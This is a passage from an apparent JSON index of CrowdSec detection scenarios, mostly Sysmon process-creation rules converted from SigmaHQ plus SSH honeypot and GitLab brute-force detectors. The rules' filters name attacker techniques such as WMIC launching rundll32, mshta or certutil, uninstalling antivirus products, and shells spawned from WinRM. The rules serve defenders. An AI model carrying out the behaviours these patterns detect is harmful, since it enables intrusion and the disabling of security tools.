attempt.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\whoami.exe' || evt.Parsed.OriginalFileName == 'whoami.exe') && (evt.Parsed.CommandLine contains ' /priv' || evt.Parsed.CommandLine contains ' -priv'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1033\n\n  label: \"Security Privileges Enumeration Via Whoami.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privileges. This is often used after a privilege escalation attempt.\n", "path": "scenarios/sigmahq/proc_creation_win_whoami_priv_discovery.yml", "version": "0.2", "versions": {"0.1": {"digest": "7901a5ef385cbf5edd8e86c6622e944c9b39225ea97fc16b284cca663a23cdb3"}, "0.2": {"digest": "fb04cc66df25fe46b3557c6d7039d0b8a57fe3eb6bf4a4ed963cb7cef3287419"}}}, "sigmahq/proc_creation_win_winget_add_insecure_custom_source": {"content": "type: trigger\nname: sigmahq/proc_creation_win_winget_add_insecure_custom_source\ndescription: |\n  Detects usage of winget to add a new insecure (http) download source. Winget will not allow the addition of insecure sources, hence this could indicate potential suspicious activity (or typos) \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\winget.exe' || evt.Parsed.OriginalFileName == 'winget.exe') && evt.Parsed.CommandLine contains 'source ' && evt.Parsed.CommandLine contains 'add ' && evt.Parsed.CommandLine contains 'http://')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"Add Insecure Download Source To Winget\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of winget to add a new insecure (http) download source. Winget will not allow the addition of insecure sources, hence this could indicate potential suspicious activity (or typos) \n", "path": "scenarios/sigmahq/proc_creation_win_winget_add_insecure_custom_source.yml", "version": "0.2", "versions": {"0.1": {"digest": "aa0c10559e306911813121dfae5afad753d47ece1692047385927c6509e123cb"}, "0.2": {"digest": "cbe1091d6ba92d1840eb804272f2340cd78058bf1e0e2130eb8e66c5cb0ab3e4"}}}, "sigmahq/proc_creation_win_winrm_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_winrm_susp_child_process\ndescription: |\n  Detects suspicious processes including shells spawnd from WinRM host process\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\wsmprovhost.exe' && (evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\sh.exe' || evt.Parsed.Image endsWith '\\\\bash.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\wsl.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.Image endsWith '\\\\whoami.exe' || evt.Parsed.Image endsWith '\\\\bitsadmin.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1190\n\n  label: \"Suspicious Processes Spawned by WinRM\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious processes including shells spawnd from WinRM host process\n", "path": "scenarios/sigmahq/proc_creation_win_winrm_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "e40841b06edbb005053f81390bb9be41811714e9d6173c179371a6b133641c47"}, "0.2": {"digest": "5f020d151224978a7bfc0961bf4eeda57ee5fc0edac9a5d384f0232acbf3c4f3"}}}, "sigmahq/proc_creation_win_wmi_backdoor_exchange_transport_agent": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wmi_backdoor_exchange_transport_agent\ndescription: |\n  Detects a WMI backdoor in Exchange Transport Agents via WMI event filters\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\EdgeTransport.exe' && not (evt.Parsed.Image == 'C:\\\\Windows\\\\System32\\\\conhost.exe' || evt.Parsed.Image startsWith 'C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\' && evt.Parsed.Image endsWith '\\\\Bin\\\\OleConverter.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1546.003\n\n  label: \"WMI Backdoor Exchange Transport Agent\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a WMI backdoor in Exchange Transport Agents via WMI event filters\n", "path": "scenarios/sigmahq/proc_creation_win_wmi_backdoor_exchange_transport_agent.yml", "version": "0.2", "versions": {"0.1": {"digest": "5d0ba230b69af246b148a736c5d394467172ceeab61d52085119356bc8b6038d"}, "0.2": {"digest": "0b941e71d2a4f889fa6bc35d32edfa1857dc37edbf20e9be5ce5a0225d691a3b"}}}, "sigmahq/proc_creation_win_wmic_eventconsumer_creation": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wmic_eventconsumer_creation\ndescription: |\n  Detects WMIC executions in which an event consumer gets created. This could be used to establish persistence\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'ActiveScriptEventConsumer' && evt.Parsed.CommandLine contains ' CREATE ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1546.003\n\n  label: \"New ActiveScriptEventConsumer Created Via Wmic.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects WMIC executions in which an event consumer gets created. This could be used to establish persistence\n", "path": "scenarios/sigmahq/proc_creation_win_wmic_eventconsumer_creation.yml", "version": "0.2", "versions": {"0.1": {"digest": "bf179b4f8896df161f4adffcf10dca524e061298e2eef269f8284132924f5d88"}, "0.2": {"digest": "cb0abb70679ddacf043336372e35fb5e0d9592e6cee0b3dcdb8b7e037abbf280"}}}, "sigmahq/proc_creation_win_wmic_namespace_defender": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wmic_namespace_defender\ndescription: |\n  Detects potential tampering with Windows Defender settings such as adding exclusion using wmic\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName == 'wmic.exe' || evt.Parsed.Image endsWith '\\\\WMIC.exe') && evt.Parsed.CommandLine contains '/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1546.008\n\n  label: \"Potential Windows Defender Tampering Via Wmic.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential tampering with Windows Defender settings such as adding exclusion using wmic\n", "path": "scenarios/sigmahq/proc_creation_win_wmic_namespace_defender.yml", "version": "0.2", "versions": {"0.1": {"digest": "9d86edeeba9a28bb92eea449e979ff43b0445ff755f11f44b125fcac5002a7a4"}, "0.2": {"digest": "5173e1bbf86507c1abb690f1ac2b3a86c7cec48f3887fe23c65574da8d378b71"}}}, "sigmahq/proc_creation_win_wmic_susp_execution_via_office_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wmic_susp_execution_via_office_process\ndescription: |\n  Office application called wmic to proxye execution through a LOLBIN process. This is often used to break suspicious parent-child chain (Office app spawns LOLBin).\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\WINWORD.EXE' || evt.Parsed.ParentImage endsWith '\\\\EXCEL.EXE' || evt.Parsed.ParentImage endsWith '\\\\POWERPNT.exe' || evt.Parsed.ParentImage endsWith '\\\\MSPUB.exe' || evt.Parsed.ParentImage endsWith '\\\\VISIO.exe' || evt.Parsed.ParentImage endsWith '\\\\MSACCESS.EXE' || evt.Parsed.ParentImage endsWith '\\\\EQNEDT32.EXE' || evt.Parsed.ParentImage endsWith '\\\\ONENOTE.EXE' || evt.Parsed.ParentImage endsWith '\\\\wordpad.exe' || evt.Parsed.ParentImage endsWith '\\\\wordview.exe') && (evt.Parsed.Image endsWith '\\\\wbem\\\\WMIC.exe' || evt.Parsed.OriginalFileName == 'wmic.exe') && evt.Parsed.CommandLine contains 'process' && evt.Parsed.CommandLine contains 'create' && evt.Parsed.CommandLine contains 'call' && (evt.Parsed.CommandLine contains 'regsvr32' || evt.Parsed.CommandLine contains 'rundll32' || evt.Parsed.CommandLine contains 'msiexec' || evt.Parsed.CommandLine contains 'mshta' || evt.Parsed.CommandLine contains 'verclsid' || evt.Parsed.CommandLine contains 'wscript' || evt.Parsed.CommandLine contains 'cscript'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1204.002\n   - attack.t1047\n   - attack.t1218.010\n\n  label: \"Suspicious WMIC Execution Via Office Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Office application called wmic to proxye execution through a LOLBIN process. This is often used to break suspicious parent-child chain (Office app spawns LOLBin).\n", "path": "scenarios/sigmahq/proc_creation_win_wmic_susp_execution_via_office_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "68f02e10f408b71b7922592314c920e569b407deca51764856c798955388aefa"}, "0.2": {"digest": "53177741dde628bf2ce928a10f4ebfa08810ff6520ffd1d9e94fb787a2fcaeef"}}}, "sigmahq/proc_creation_win_wmic_susp_process_creation": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wmic_susp_process_creation\ndescription: |\n  Detects WMIC executing \"process call create\" with suspicious calls to processes such as \"rundll32\", \"regsrv32\", etc.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'process ' && evt.Parsed.CommandLine contains 'call ' && evt.Parsed.CommandLine contains 'create ' && (evt.Parsed.CommandLine contains 'rundll32' || evt.Parsed.CommandLine contains 'bitsadmin' || evt.Parsed.CommandLine contains 'regsvr32' || evt.Parsed.CommandLine contains 'cmd.exe /c ' || evt.Parsed.CommandLine contains 'cmd.exe /k ' || evt.Parsed.CommandLine contains 'cmd.exe /r ' || evt.Parsed.CommandLine contains 'cmd /c ' || evt.Parsed.CommandLine contains 'cmd /k ' || evt.Parsed.CommandLine contains 'cmd /r ' || evt.Parsed.CommandLine contains 'powershell' || evt.Parsed.CommandLine contains 'pwsh' || evt.Parsed.CommandLine contains 'certutil' || evt.Parsed.CommandLine contains 'cscript' || evt.Parsed.CommandLine contains 'wscript' || evt.Parsed.CommandLine contains 'mshta' || evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\' || evt.Parsed.CommandLine contains '%temp%' || evt.Parsed.CommandLine contains '%tmp%' || evt.Parsed.CommandLine contains '%ProgramData%' || evt.Parsed.CommandLine contains '%appdata%' || evt.Parsed.CommandLine contains '%comspec%' || evt.Parsed.CommandLine contains '%localappdata%'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1047\n\n  label: \"Suspicious Process Created Via Wmic.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects WMIC executing \"process call create\" with suspicious calls to processes such as \"rundll32\", \"regsrv32\", etc.\n", "path": "scenarios/sigmahq/proc_creation_win_wmic_susp_process_creation.yml", "version": "0.2", "versions": {"0.1": {"digest": "d5bdded1a7c3f8d911dd00b76a40043d0c55ae29f1551a2c40808bee4ce76495"}, "0.2": {"digest": "f7a889c5f11bc73b588d15a93500ea7283b611f9c7d7c2c812a0ab0a67d6d353"}}}, "sigmahq/proc_creation_win_wmic_uninstall_security_products": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wmic_uninstall_security_products\ndescription: |\n  Detects uninstallation or termination of security products using the WMIC utility\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains 'wmic' && evt.Parsed.CommandLine contains 'product where ' && evt.Parsed.CommandLine contains 'call' && evt.Parsed.CommandLine contains 'uninstall' && evt.Parsed.CommandLine contains '/nointeractive' || evt.Parsed.CommandLine contains 'wmic' && evt.Parsed.CommandLine contains 'caption like ' && (evt.Parsed.CommandLine contains 'call delete' || evt.Parsed.CommandLine contains 'call terminate') || evt.Parsed.CommandLine contains 'process ' && evt.Parsed.CommandLine contains 'where ' && evt.Parsed.CommandLine contains 'delete') && (evt.Parsed.CommandLine contains '%carbon%' || evt.Parsed.CommandLine contains '%cylance%' || evt.Parsed.CommandLine contains '%endpoint%' || evt.Parsed.CommandLine contains '%eset%' || evt.Parsed.CommandLine contains '%malware%' || evt.Parsed.CommandLine contains '%Sophos%' || evt.Parsed.CommandLine contains '%symantec%' || evt.Parsed.CommandLine contains 'Antivirus' || evt.Parsed.CommandLine contains 'AVG ' || evt.Parsed.CommandLine contains 'Carbon Black' || evt.Parsed.CommandLine contains 'CarbonBlack' || evt.Parsed.CommandLine contains 'Cb Defense Sensor 64-bit' || evt.Parsed.CommandLine contains 'Crowdstrike Sensor' || evt.Parsed.CommandLine contains 'Cylance ' || evt.Parsed.CommandLine contains 'Dell Threat Defense' || evt.Parsed.CommandLine contains 'DLP Endpoint' || evt.Parsed.CommandLine contains 'Endpoint Detection' || evt.Parsed.CommandLine contains 'Endpoint Protection' || evt.Parsed.CommandLine contains 'Endpoint Security' || evt.Parsed.CommandLine contains 'Endpoint Sensor' || evt.Parsed.CommandLine contains 'ESET File Security' || evt.Parsed.CommandLine contains 'LogRhythm System Monitor Service' || evt.Parsed.CommandLine contains 'Malwarebytes' || evt.Parsed.CommandLine contains 'McAfee Agent' || evt.Parsed.CommandLine contains 'Microsoft Security Client' || evt.Parsed.CommandLine contains 'Sophos Anti-Virus' || evt.Parsed.CommandLine contains 'Sophos AutoUpdate' || evt.Parsed.CommandLine contains 'Sophos Credential Store' || evt.Parsed.CommandLine contains 'Sophos Management Console' || evt.Parsed.CommandLine contains 'Sophos Management Database' || evt.Parsed.CommandLine contains 'Sophos Management Server' || evt.Parsed.CommandLine contains 'Sophos Remote Management System' || evt.Parsed.CommandLine contains 'Sophos Update Manager' || evt.Parsed.CommandLine contains 'Threat Protection' || evt.Parsed.CommandLine contains 'VirusScan' || evt.Parsed.CommandLine contains 'Webroot SecureAnywhere' || evt.Parsed.CommandLine contains 'Windows Defender'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Potential Tampering With Security Products Via WMIC\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects uninstallation or termination of security products using the WMIC utility\n", "path": "scenarios/sigmahq/proc_creation_win_wmic_uninstall_security_products.yml", "version": "0.2", "versions": {"0.1": {"digest": "a352f8487341bedecba09d3efabafde6fdee9132abfffc30e7a9e5a608d3c6dc"}, "0.2": {"digest": "270621bfc00026f4f73805463f03886afce96171abdcb5c144074bc638ab80b5"}}}, "sigmahq/proc_creation_win_wmiprvse_susp_child_processes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wmiprvse_susp_child_processes\ndescription: |\n  Detects suspicious and uncommon child processes of WmiPrvSE\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\wbem\\\\WmiPrvSE.exe' && (evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\msiexec.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\verclsid.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' && (evt.Parsed.CommandLine contains 'cscript' || evt.Parsed.CommandLine contains 'mshta' || evt.Parsed.CommandLine contains 'powershell' || evt.Parsed.CommandLine contains 'pwsh' || evt.Parsed.CommandLine contains 'regsvr32' || evt.Parsed.CommandLine contains 'rundll32' || evt.Parsed.CommandLine contains 'wscript')) && not (evt.Parsed.Image endsWith '\\\\WerFault.exe' || evt.Parsed.Image endsWith '\\\\WmiPrvSE.exe' || evt.Parsed.Image endsWith '\\\\msiexec.exe' && evt.Parsed.CommandLine contains '/i '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1047\n   - attack.t1204.002\n   - attack.t1218.010\n\n  label: \"Suspicious WmiPrvSE Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious and uncommon child processes of WmiPrvSE\n", "path": "scenarios/sigmahq/proc_creation_win_wmiprvse_susp_child_processes.yml", "version": "0.2", "versions": {"0.1": {"digest": "4a509188d7f02c05ca3fe91ec9b476052ffe9330608e27120f8af395f447a99c"}, "0.2": {"digest": "065113458b28d16a85c2a3d67da1c5823a17b74026596a33de0c9db88a60bf26"}}}, "sigmahq/proc_creation_win_wpbbin_potential_persistence": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wpbbin_potential_persistence\ndescription: |\n  Detects execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image == 'C:\\\\Windows\\\\System32\\\\wpbbin.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1542.001\n\n  label: \"UEFI Persistence Via Wpbbin - ProcessCreation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section\n", "path": "scenarios/sigmahq/proc_creation_win_wpbbin_potential_persistence.yml", "version": "0.2", "versions": {"0.1": {"digest": "8ba08e3ce2ad375eb1bb6d0f702369ce1c351acb7733dfd18264aa33838ea76f"}, "0.2": {"digest": "0fadcb20d938882bfbc420286ca3927d0b37b8adfdf177e4326e9ebc6c35de6d"}}}, "sigmahq/proc_creation_win_wscript_cscript_uncommon_extension_exec": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wscript_cscript_uncommon_extension_exec\ndescription: |\n  Detects Wscript/Cscript executing a file with an uncommon (i.e. non-script) extension\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName in ['wscript.exe', 'cscript.exe'] || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe') && (evt.Parsed.CommandLine contains '.csv' || evt.Parsed.CommandLine contains '.dat' || evt.Parsed.CommandLine contains '.doc' || evt.Parsed.CommandLine contains '.gif' || evt.Parsed.CommandLine contains '.jpeg' || evt.Parsed.CommandLine contains '.jpg' || evt.Parsed.CommandLine contains '.png' || evt.Parsed.CommandLine contains '.ppt' || evt.Parsed.CommandLine contains '.txt' || evt.Parsed.CommandLine contains '.xls' || evt.Parsed.CommandLine contains '.xml'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.005\n   - attack.t1059.007\n\n  label: \"Cscript/Wscript Uncommon Script Extension Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Wscript/Cscript executing a file with an uncommon (i.e. non-script) extension\n", "path": "scenarios/sigmahq/proc_creation_win_wscript_cscript_uncommon_extension_exec.yml", "version": "0.2", "versions": {"0.1": {"digest": "c889b9e4dded790ce978e82a130e5ae3c2fb4add4d110e9ed53e74850e40d4d8"}, "0.2": {"digest": "6520d5bc82efa92b125ea343a5d3d6f586b5be8c31eb56d1ad6cd212c36cc240"}}}, "sigmahq/proc_creation_win_wuauclt_dll_loading": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wuauclt_dll_loading\ndescription: |\n  Detects the use of the Windows Update Client binary (wuauclt.exe) for proxy execution.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\wuauclt.exe' || evt.Parsed.OriginalFileName == 'wuauclt.exe') && evt.Parsed.CommandLine contains 'UpdateDeploymentProvider' && evt.Parsed.CommandLine contains 'RunHandlerComServer' && not (evt.Parsed.CommandLine contains ' /UpdateDeploymentProvider UpdateDeploymentProvider.dll ' || evt.Parsed.CommandLine contains ' wuaueng.dll ' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\UUS\\\\Packages\\\\Preview\\\\amd64\\\\updatedeploy.dll /ClassId' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\UUS\\\\amd64\\\\UpdateDeploy.dll /ClassId' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\WinSxS\\\\' && evt.Parsed.CommandLine contains '\\\\UpdateDeploy.dll /ClassId '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Proxy Execution Via Wuauclt.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of the Windows Update Client binary (wuauclt.exe) for proxy execution.\n", "path": "scenarios/sigmahq/proc_creation_win_wuauclt_dll_loading.yml", "version": "0.2", "versions": {"0.1": {"digest": "d704008f92ebfdf48fce86e737b5de91f380e71dcc69ca30a33f39b3de44de96"}, "0.2": {"digest": "27dc1cfffb5492584cc3c076bc3a42cbf88f4505e8f03e6b88ac3c6697c88013"}}}, "sigmahq/proc_creation_win_wuauclt_no_cli_flags_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wuauclt_no_cli_flags_execution\ndescription: |\n  Detects suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\Wuauclt.exe' || evt.Parsed.OriginalFileName == 'Wuauclt.exe') && (evt.Parsed.CommandLine endsWith 'Wuauclt' || evt.Parsed.CommandLine endsWith 'Wuauclt.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n\n  label: \"Suspicious Windows Update Agent Empty Cmdline\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags \n", "path": "scenarios/sigmahq/proc_creation_win_wuauclt_no_cli_flags_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "694350cd173cd9bec5966e9b97ef17fcd5a8c7ace6d7e97df209f89b2bdfb57d"}, "0.2": {"digest": "5986180c4c89924e6ffecacad00f759383c9171055c96961b02462b0a2f1a650"}}}, "sigmahq/proc_creation_win_wusa_cab_files_extraction_from_susp_paths": {"content": "type: trigger\nname: sigmahq/proc_creation_win_wusa_cab_files_extraction_from_susp_paths\ndescription: |\n  Detects the execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract \".cab\" files using the \"/extract\" argument from potentially suspicious paths. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\wusa.exe' && evt.Parsed.CommandLine contains '/extract:' && (evt.Parsed.CommandLine contains ':\\\\PerfLogs\\\\' || evt.Parsed.CommandLine contains ':\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\Appdata\\\\Local\\\\Temp\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract \".cab\" files using the \"/extract\" argument from potentially suspicious paths. \n", "path": "scenarios/sigmahq/proc_creation_win_wusa_cab_files_extraction_from_susp_paths.yml", "version": "0.2", "versions": {"0.1": {"digest": "4251ad8d79ec058c5220b79ae5973e3a582c997a92ae84cd86dfcaa144584fef"}, "0.2": {"digest": "71c1b50322d48e2d304fdb994c1bb2f6a7011c13a1537769d825902c0e68207e"}}}, "sigmahq/proc_creation_win_xwizard_execution_non_default_location": {"content": "type: trigger\nname: sigmahq/proc_creation_win_xwizard_execution_non_default_location\ndescription: |\n  Detects the execution of Xwizard tool from a non-default directory. When executed from a non-default directory, this utility can be abused in order to side load a custom version of \"xwizards.dll\". \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\xwizard.exe' || evt.Parsed.OriginalFileName == 'xwizard.exe') && not (evt.Parsed.Image startsWith 'C:\\\\Windows\\\\System32\\\\' || evt.Parsed.Image startsWith 'C:\\\\Windows\\\\SysWOW64\\\\' || evt.Parsed.Image startsWith 'C:\\\\Windows\\\\WinSxS\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.002\n\n  label: \"Xwizard.EXE Execution From Non-Default Location\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of Xwizard tool from a non-default directory. When executed from a non-default directory, this utility can be abused in order to side load a custom version of \"xwizards.dll\". \n", "path": "scenarios/sigmahq/proc_creation_win_xwizard_execution_non_default_location.yml", "version": "0.2", "versions": {"0.1": {"digest": "b34a25b9c570bf7c93ceb19ae644869d7e4d61a463a62e77f500e4c1bfccdc73"}, "0.2": {"digest": "58db5702ee6cf57202050cfe71c4d3b9ced47a8c6ab8cd5dbbc491934e85cc5b"}}}, "thespad/sshesame-honeypot": {"content": "# sshesame bruteforce\ntype: leaky\nname: thespad/sshesame-bf\ndescription: \"Detect sshesame bruteforce\"\nfilter: \"evt.Meta.log_type == 'sshesame_login'\"\nleakspeed: \"30m\"\ncapacity: 3\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  service: sshesame\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"ssh:bruteforce\"\n  label: \"SSHesame Bruteforce\"\n  remediation: true\n---\n# sshesame commands\ntype: trigger\nname: thespad/sshesame-cmd\ndescription: \"Detect sshesame commands\"\nfilter: \"evt.Meta.log_type == 'sshesame_cmd'\"\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  service: sshesame\n  type: command\n  behavior: \"ssh:bruteforce\"\n  classification:\n    - attack.T1059\n  spoofable: 0\n  confidence: 3\n  remediation: true\n---\n# sshesame input\ntype: leaky\nname: thespad/sshesame-input\ndescription: \"Detect sshesame input spam\"\nfilter: \"evt.Meta.log_type == 'sshesame_input'\"\nleakspeed: \"5m\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  service: sshesame\n  behavior: \"ssh:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1059\n  remediation: true\n", "description": "Detect sshesame bruteforce", "path": "scenarios/thespad/sshesame-honeypot.yaml", "version": "0.4", "versions": {"0.1": {"digest": "0818e9e2be666b4e6315050b7fa96f82dc47b6010c07704370738875842c160b"}, "0.2": {"digest": "a6120c94b2390d7deea3b79407e37870e084fed11d08bd7434162ce6f84257a5"}, "0.3": {"digest": "950cf9776305bfb38f8711a5d5a2ed59f533e40e51666b0393d0117634bf4799"}, "0.4": {"digest": "8254538cdb89d46898003bf5f3174f1948e36d5ea0067cf2e1c200026ed6b950"}}}, "timokoessler/gitlab-bf": {"content": "# gitlab bruteforce\ntype: leaky\nname: timokoessler/gitlab-bf\ndescription: \"Detect gitlab bruteforce\"\nfilter: \"evt.Meta.log_type in ['gitlab_failed_password', 'gitlab_failed_totp']\"\nleakspeed: \"20s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: 